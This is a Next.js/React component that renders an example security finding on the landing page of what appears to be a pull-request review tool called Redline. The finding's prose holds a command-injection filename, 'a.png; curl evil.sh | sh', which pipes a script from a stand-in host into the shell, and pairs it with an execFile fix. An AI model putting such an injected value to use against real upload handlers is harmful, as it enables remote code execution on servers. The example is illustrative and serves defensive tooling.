import Link from "next/link";

// The finding, above the fold, because it is the product. Everything else in
// the hero is a claim about Redline; this is the only thing on screen that is
// Redline's actual output.
//
// Not FindingPanel: that one carries the diff and the three-reviewer toggle,
// and its point — same rule id whichever model wrote the prose — needs the
// diff above it to land. Hoisting it here would spend section 4 before the
// reader reaches it. So this is the same output contract with nothing
// interactive: one comment, as it arrives on the pull request.
//
// Severity and rule id are passed in from the rule the page already looks up,
// so a renamed rule fails the build rather than leaving the hero quoting a
// contract the standard no longer honours.
export function HeroFinding({
  severity,
  ruleId,
  ruleHref,
  file,
}: {
  severity: string;
  ruleId: string;
  ruleHref: string;
  file: string;
}) {
  return (
    <figure className="hf">
      <figcaption className="hf-head">
        <span className="hf-who">
          <span aria-hidden="true" className="hf-dot" />
          redline-gate
        </span>
        <span className="hf-sev">{severity}</span>
      </figcaption>

      <div className="hf-body">
        <p className="hf-prefix">
          <span className="hf-prefix-sev">Redline/{severity}</span>{" "}
          <span className="hf-prefix-id">
            [<Link href={ruleHref}>{ruleId}</Link>]
          </span>
          :
        </p>
        {/* The consequence, not the mechanism. Section 4 carries the mechanism
            and the fix beside the diff that produced them, and two near-identical
            sentences about one rule read as a page with a single example. */}
        <p className="hf-prose">
          A file uploaded as <code>a.png; curl evil.sh | sh</code> runs when the
          handler resizes it.
        </p>
        <p className="hf-fix">
          <span aria-hidden="true">→</span>{" "}
          <code>execFile(&apos;convert&apos;, [body.filename, &apos;-resize&apos;, &apos;100x100&apos;])</code>
        </p>
      </div>

      <div className="hf-foot">
        <span>posted on the pull request</span>
        <code>{file}</code>
      </div>
    </figure>
  );
}
